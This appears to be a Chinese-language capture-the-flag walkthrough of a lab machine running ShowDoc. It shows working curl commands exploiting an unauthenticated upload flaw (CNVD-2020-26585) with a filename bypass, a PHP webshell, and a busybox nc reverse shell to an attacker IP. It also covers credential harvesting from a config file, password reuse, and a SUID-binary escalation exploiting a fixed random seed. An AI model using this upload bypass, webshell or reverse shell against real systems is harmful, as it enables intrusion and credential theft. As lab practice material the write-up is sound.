# 信息收集

```bash
IP=192.168.205.202
nmap -p0-65535 $IP
```

开了 22 和 80，Apache on Debian，SSH 允许密码登录。

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

直接上 Nuclei 扫一波。

```bash
nuclei -u http://$IP
```

几个关键命中：

```
[CNVD-2020-26585] [http] [critical] http://192.168.205.202/Public//Uploads//2026-06-04//6a21767742475.txt
[showdoc-panel] [http] [info] http://192.168.205.202/web/#/user/login
[dockerfile-hidden-disclosure] [http] [medium] http://192.168.205.202/Dockerfile
```

ShowDoc 文档管理系统，直接中奖。CNVD-2020-26585 是 ShowDoc 的前台未授权任意文件上传，Nuclei 已经验证成功并上传了一个 txt 文件。

# 初始突破

## 漏洞分析

翻了一下这个 CVE 对应的 GitHub PR（star7th/showdoc#1059），问题出在 `PageController.class.php` 第 150 行：

```php
$upload->allowExts = array('jpg', 'gif', 'png', 'jpeg');
```

`allowExts` 不是 ThinkPHP `Upload` 类的合法属性，正确写法是 `exts`。属性名写错导致后缀限制完全失效，加上方法没调用 `$this->checkLogin()`，未登录就能传任意文件。

## 文件上传 GetShell

我一开始直接用 curl 传 php 文件，踩了几个坑。

先试了 `/api/page/uploadImg` 路径：

```bash
curl -v -F "editormd-image-file=@cmd.php;filename=shell.php;type=image/jpeg" "http://$IP/index.php?s=/api/page/uploadImg"
```

返回了数据库不可写的错误：

```json
{"error_code":"10103","error_message":"Sqlite\/showdoc.db.php\u6587\u4ef6\u4e0d\u53ef\u5199"}
```

换成 `/home/page/uploadImg`，返回 200 但 Content-Length 为 0，一片空白。我当时有点懵，明明 Nuclei 能传上去。

回头看 Nuclei 的模板文件，发现关键细节——filename 里带了 `<>` 符号：`filename="{{randstr}}.<>txt"`。这个 `<>` 是绕过 ThinkPHP 过滤的技巧。照着模板格式构造：

```bash
curl -v -F 'editormd-image-file=@cmd.php;filename=cmd.<>php;type=text/plain' "http://$IP/index.php?s=/home/page/uploadImg"
```

这次成功了：

```json
{"url":"http:\/\/192.168.205.202\/Public\/Uploads\/2026-06-04\/6a2178ebd3f08.php","success":1}
```

`cmd.php` 的内容是一个简单的 webshell：

```php
GIF89a;
<?php 
if(isset($_GET['a']) && isset($_GET['b'])) {
    $a = $_GET['a'];
    $b = $_GET['b'];
    $a($b);
}
?>
```

## 反弹 shell

攻击机开监听：

```bash
nc -lvnp 8888
```

通过 webshell 触发反弹：

```
http://192.168.205.202/Public/Uploads/2026-06-04/6a2178ebd3f08.php?a=exec&b=busybox nc 192.168.205.128 8888 -e /bin/bash
```

收到 shell，升级交互式终端：

```bash
script /dev/null -c bash
```

当前身份是 `www-data`。

# 横向移动

## 凭据收集

翻 ShowDoc 的配置文件：

```bash
cat /var/www/html/server/Application/Common/Conf/config.php | grep DB_PWD
```

```
'DB_PWD' => 'showdoc123456',
```

系统上有两个普通用户：

```bash
grep bash /etc/passwd
```

```
root:x:0:0:root:/root:/bin/bash
mooi:x:1000:1000:,,,:/home/mooi:/bin/bash
l1qin9:x:1001:1001:,,,:/home/l1qin9:/bin/bash
```

## www-data 到 mooi

密码复用，直接 su：

```bash
su mooi
```

密码 `showdoc123456`，成功切换。

## mooi 到 l1qin9

同样密码复用：

```bash
su l1qin9
```

密码 `showdoc123456`，拿到 l1qin9 的 shell。两个用户都没有 sudo 权限。

# 提权

## 发现 SUID 程序

l1qin9 的 home 目录下有个不寻常的东西：

```bash
ls -la ~/auth_monitor
```

```
-rwsr-sr-x 1 root root 16632 Apr 25 22:43 auth_monitor
```

SUID + SGID，root 属主，自定义二进制。跑起来看看行为：

```
--- MAZE-SEC ACCESS MONITOR ---
SYSTEM_TICK: 1780578767
CHALLENGE_STAMP: f01957e7
ENTER ACCESS CODE:
```

要求输入一个 ACCESS CODE，输错就 ACCESS DENIED。输对了会以 root 身份读取 `/root/show.txt`。

## 逆向分析

用 strings 看到几个关键字符串：`/dev/urandom`、`CHALLENGE_STAMP`、`ACCESS DENIED`、`/root/show.txt`，还有一个有意思的符号名 `s0rand`。

拉回来丢进反编译器，main 函数逻辑很清晰：

```c
// 从 /dev/urandom 读 4 字节作为 buf
read(fd, &buf, 4);

// 用 buf 和 argv[0] 第一个字符算一个种子 v13
for (i = 0; i <= 99; i++) {
    v13 += buf % (i + 1);
    v13 ^= **argv;
}

// 设置随机种子
s0rand(v13);
v10 = rand();

// 打印 CHALLENGE_STAMP（就是 buf 的十六进制）
printf("CHALLENGE_STAMP: %08x\n", buf);

// 要求输入，匹配则 setuid(0) 读 /root/show.txt
scanf("%d", &v7);
if (v10 == v7) {
    setuid(0); setgid(0);
    // 读取并打印 /root/show.txt
}
```

看上去需要根据 CHALLENGE_STAMP 推算出 rand() 的结果。种子计算还涉及 argv[0] 的第一个字符，有点麻烦。

但翻到 `s0rand` 的实现，整个人就笑了：

```c
void s0rand() {
    srand(0x539);  // 1337
}
```

传入的参数完全被忽略，固定用 `srand(1337)`。也就是说不管 CHALLENGE_STAMP 是什么，`rand()` 的返回值永远是同一个数。

## 利用

一行搞定：

```bash
python3 -c "import ctypes;l=ctypes.CDLL('libc.so.6');l.srand(1337);print(l.rand())" | ./auth_monitor
```

```
--- MAZE-SEC ACCESS MONITOR ---
SYSTEM_TICK: 1780578767
CHALLENGE_STAMP: f01957e7
ENTER ACCESS CODE: 1NOjcN9b9uqUJ0VPYbgi
```

输出了 `/root/show.txt` 的内容，里面是 root 密码。直接 su：

```bash
su root
```

输入拿到的密码，切到 root。

# Flag

```bash
cat /home/mooi/user.txt
cat /root/root.txt
```

```
flag{user-f5ce64ad520f46e2bcb1dc94dbb6dbd3}
flag{root-64f26bcf00751fcbe2d03d5a7d7c93ef}
```